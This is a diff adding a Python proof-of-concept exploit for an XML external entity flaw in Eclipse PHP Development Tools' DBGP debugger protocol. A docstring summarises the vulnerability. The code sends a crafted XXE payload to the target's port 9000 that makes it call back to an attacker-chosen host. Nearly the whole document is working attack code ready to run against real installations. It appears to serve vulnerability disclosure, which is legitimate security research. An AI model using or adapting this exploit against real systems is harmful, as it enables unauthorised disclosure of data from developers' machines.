@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+"""
+Eclipse PHP Development Tools DBGP XML External Entity Processing Information Disclosure Vulnerability
+Download: https://github.com/eclipse/pdt
+Discovery date: 17/6/2021
+Status: Reported to the vendor
+CVSS: 7.5 (/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+# Summary:
+
+This vulnerability allows remote attackers to disclose sensitive information on affected installations of Eclipse PHP Development Tools. Authentication is not required to exploit this vulnerability.
+
+The specific flaw exists within the DBG protocol. The issue results from the lack of proper validation of a user-supplied xml. An attacker can leverage this vulnerability to disclose information in the context of user running Eclipse.
+"""
+
+import sys
+import socket
+
+if __name__ == "__main__":
+    if(len(sys.argv) < 3):
+        print("(+) usage: %s <target> <connectback>" % sys.argv[0])
+        print("(+) eg: %s 192.168.1.2 192.168.1.3" % sys.argv[0])
+        sys.exit(-1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    xxe = """<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY %% si SYSTEM "http://%s/xxe">
+%%si;
+]>""" % c
+    data  = str(len(xxe))
+    data += "\x00"
+    data += xxe
+    data += "\x00"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((t, 9000)) # default port, but yours maybe different
+    s.send(data.encode())
+    s.close()
